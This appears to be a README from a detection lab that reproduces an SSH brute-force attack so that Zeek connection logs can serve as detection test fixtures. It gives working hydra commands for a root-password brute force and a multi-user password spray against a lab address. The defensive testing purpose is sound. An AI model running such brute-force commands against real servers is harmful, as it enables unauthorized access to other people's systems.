# Attack reproduction — SSH brute force (hydra)

Throw a small wordlist at a lab SSH server. Zeek records each attempt as
a short conn.log entry; the detection in `../detection/` aggregates and
fires.

## Prereqs

- Attacker host on the lab subnet with `hydra` installed
- Target host on the lab bridge running `sshd`
- Lab compose stack running

## Run (high level)

```bash
# Quick brute force against a known username, small wordlist
hydra -l root -P /usr/share/wordlists/rockyou-top100.txt \
      -t 16 -f ssh://192.168.1.20

# Multi-user spray (slower; hits a different signal — across many
# sources to one dest, this becomes T1110.003 password spraying)
hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.1.20
```

## Capture telemetry into a fixture

```bash
docker exec detlab-zeek cat /usr/local/zeek/logs/current/conn.log \
  | jq -c "select(.\"id.resp_p\" == 22 and .\"id.orig_h\" == \"<attacker_ip>\")" \
  > /tmp/sshbrute_capture.log
head -100 /tmp/sshbrute_capture.log > tests/positive_conn.log
```

## Safety / scope

- Lab use only.
- The synthetic `tests/positive_conn.log` shipped here is generated by
  `scripts/generate_fixtures.py` so the test suite is hermetic.
